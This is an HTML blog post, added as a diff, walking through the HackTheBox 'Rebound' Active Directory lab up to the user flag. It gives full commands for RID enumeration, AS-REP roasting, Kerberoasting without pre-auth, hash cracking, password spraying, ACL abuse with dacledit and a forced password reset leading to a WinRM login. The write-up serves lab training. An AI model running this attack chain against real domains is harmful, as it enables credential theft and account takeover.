@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HackTheBox: Rebound — Satej Chaudhari</title>
+  <meta name="description" content="HackTheBox Rebound walkthrough (to the user flag) — a RID-brute user list feeds a no-pre-auth Kerberoast, a cracked service ticket is reused, and a BloodHound chain of group self-add and forced ACL inheritance resets a service account for the user flag.">
+
+  <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script>
+  (function(){
+    try{var t=localStorage.getItem('theme');if(t==='light'||t==='dark')document.documentElement.setAttribute('data-theme',t);}catch(e){}
+    document.addEventListener('DOMContentLoaded',function(){
+      var b=document.querySelector('.theme-toggle');
+      if(b)b.addEventListener('click',function(){
+        var d=document.documentElement,c=d.getAttribute('data-theme')||'dark',n=c==='dark'?'light':'dark';
+        d.setAttribute('data-theme',n);try{localStorage.setItem('theme',n);}catch(e){}
+      });
+      var nt=document.querySelector('.nav-toggle'),nv=document.querySelector('.site-nav');
+      if(nt&&nv&&!nt.dataset.bound){nt.dataset.bound='1';nt.addEventListener('click',function(){var o=nv.classList.toggle('open');nt.setAttribute('aria-expanded',o?'true':'false');});}
+    });
+  })();
+  </script>
+</head>
+<body>
+
+  <header class="site-header">
+    <div class="wrap-wide">
+      <a class="brand" href="../index.html">
+        <span class="brand-mark">SC</span>
+        <span class="brand-name">Satej Chaudhari</span>
+      </a>
+      <nav class="site-nav">
+        <a href="../index.html">Home</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="../writeups.html">Writeups</a>
+      </nav>
+      <button class="theme-toggle" aria-label="Toggle light and dark theme" title="Toggle theme">
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+      </button>
+      <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+      </button>
+    </div>
+  </header>
+
+  <main class="wrap post">
+    <a class="post-back" href="../writeups.html">&larr; back to writeups</a>
+
+    <article>
+      <header class="post-header">
+        <span class="tag">HackTheBox</span>
+        <h1 class="post-title">HackTheBox: Rebound</h1>
+        <p class="post-meta">
+          <time datetime="2026-10-02">2026-10-02</time>
+          <span>&middot; 13 min read</span>
+        </p>
+      </header>
+
+      <div class="post-body">
+
+        <p><strong>Rebound</strong> is a hard Active Directory box (<code>rebound.htb</code>). A RID-brute user list feeds a no-pre-auth Kerberoast, a cracked service ticket is reused across accounts, and a BloodHound-guided chain — group self-add, then forcing ACL inheritance down an OU with <code>dacledit</code> — resets a service account for the user flag. <em>This writeup covers the box up to the user flag.</em></p>
+
+        <h2>Reconnaissance</h2>
+
+        <pre><code>nmap -Pn -p- -sC -sV 10.129.232.31
+
+88/tcp  kerberos-sec   (domain: rebound.htb, dc01.rebound.htb)
+389/tcp ldap
+445/tcp microsoft-ds
+5985/tcp http          WinRM</code></pre>
+
+        <h2>SMB &amp; RID enumeration</h2>
+
+        <p>Guest can read a couple of shares (nothing useful in them) but, importantly, can still be used to cycle RIDs and recover the full user list:</p>
+
+        <pre><code>ridenum 10.129.232.31 500 20000 Guest &#x27;&#x27;
+Domain Sid: S-1-5-21-4078382237-1492182817-2568127209
+  Administrator  Guest  krbtgt  DC01$  ppaul  llune  fflock
+  jjones  mmalone  nnoon  ldap_monitor  oorend  winrm_svc
+  batch_runner  tbrady  delegator$</code></pre>
+
+        <h2>AS-REP + no-pre-auth Kerberoast</h2>
+
+        <p>An AS-REP roast across the list shows <code>jjones</code> has pre-authentication disabled:</p>
+
+        <pre><code>impacket-GetNPUsers -usersfile reboundusers.txt rebound.htb/ -dc-ip 10.129.232.31
+$krb5asrep$23$jjones@REBOUND.HTB:...</code></pre>
+
+        <p>Because <code>jjones</code> needs no pre-auth, it can be used as the requesting principal to Kerberoast <em>without a password</em> (<code>-no-preauth</code>), which returns service tickets for several accounts:</p>
+
+        <pre><code>impacket-GetUserSPNs -no-preauth jjones -usersfile reboundusers.txt -dc-host 10.129.232.31 rebound.htb/
+$krb5tgs$...ldap_monitor...
+$krb5tgs$...delegator...
+$krb5tgs$...DC01$...</code></pre>
+
+        <p>The <code>ldap_monitor</code> ticket cracks against rockyou:</p>
+
+        <pre><code>hashcat -m 13100 ldap_monitor_hash rockyou.txt
+$krb5tgs$23$*ldap_monitor$REBOUND.HTB$...:1GR8t@$$4u</code></pre>
+
+        <h2>Password reuse → oorend</h2>
+
+        <p>The password authenticates as <code>ldap_monitor</code>, and a BloodHound collection runs over LDAP with Kerberos. Spraying that same password across the user list shows it is reused by <code>oorend</code>:</p>
+
+        <pre><code>nxc smb 10.129.232.31 -u reboundusers.txt -p &#x27;1GR8t@$$4u&#x27; --continue-on-success
+[+] rebound.htb\ldap_monitor:1GR8t@$$4u
+[+] rebound.htb\oorend:1GR8t@$$4u</code></pre>
+
+        <figure>
+          <img src="../assets/img/htb-rebound/img1.png" alt="BloodHound path from oorend through ServiceMgmt to the Service Users OU">
+          <figcaption>BloodHound: <code>oorend</code> → <code>ServiceMgmt</code> → GenericAll over the Service Users OU.</figcaption>
+        </figure>
+
+        <h2>Group self-add + forced ACL inheritance → user flag</h2>
+
+        <p>oorend can add itself to the <code>ServiceMgmt</code> group, which has full control over the <code>Service Users</code> OU:</p>
+
+        <pre><code>powerview rebound.htb/oorend:...@dc01.rebound.htb ...
+Add-DomainGroupMember -Identity &quot;SERVICEMGMT&quot; -Members oorend</code></pre>
+
+        <blockquote>Full control over an <em>OU</em> is not automatically full control over the <em>users</em> inside it — those ACEs are not inherited by default. But with full control over the OU you can add a new ACE that <em>is</em> marked inheritable, so it trickles down to the child objects. The clean, OPSEC-safe route here is Shadow Credentials via Certipy; this writeup took the simpler password-reset path.</blockquote>
+
+        <p>Use Impacket's <code>dacledit</code> to write an inheritable FullControl ACE on the OU, which then applies to <code>winrm_svc</code>:</p>
+
+        <pre><code>impacket-getTGT &#x27;rebound.htb&#x27;/&#x27;oorend&#x27;:&#x27;1GR8t@$$4u&#x27; -dc-ip rebound.htb
+export KRB5CCNAME=oorend.ccache
+
+dacledit.py -k -no-pass -action write -rights FullControl \
+  -principal oorend -target-dn &#x27;OU=Service Users,DC=rebound,DC=htb&#x27; \
+  -inheritance &#x27;rebound.htb&#x27;/&#x27;oorend&#x27; -use-ldaps -dc-ip rebound.htb
+[*] DACL modified successfully!</code></pre>
+
+        <p>With inherited control over <code>winrm_svc</code>, reset its password and WinRM in for the user flag:</p>
+
+        <pre><code>bloodyAD -d rebound.htb -k --host dc01.rebound.htb set password winrm_svc &#x27;Password@1&#x27;
+evil-winrm -i dc01.rebound.htb -u winrm_svc -p &#x27;Password@1&#x27;
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop&gt; type user.txt</code></pre>
+
+        <blockquote>That is the user flag. The path to root continues from the <code>delegator$</code> ticket and a Shadow-Credentials/Certipy step against the DC — out of scope for this writeup, which stops at user.</blockquote>
+
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap-wide">
+      <p>&copy; 2026 Satej Chaudhari</p>
+      <div class="footer-links">
+        <a href="../writeups.html">Writeups</a>
+        <a href="../theory.html">Theory</a>
+<a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="../disclaimer.html">Disclaimer</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
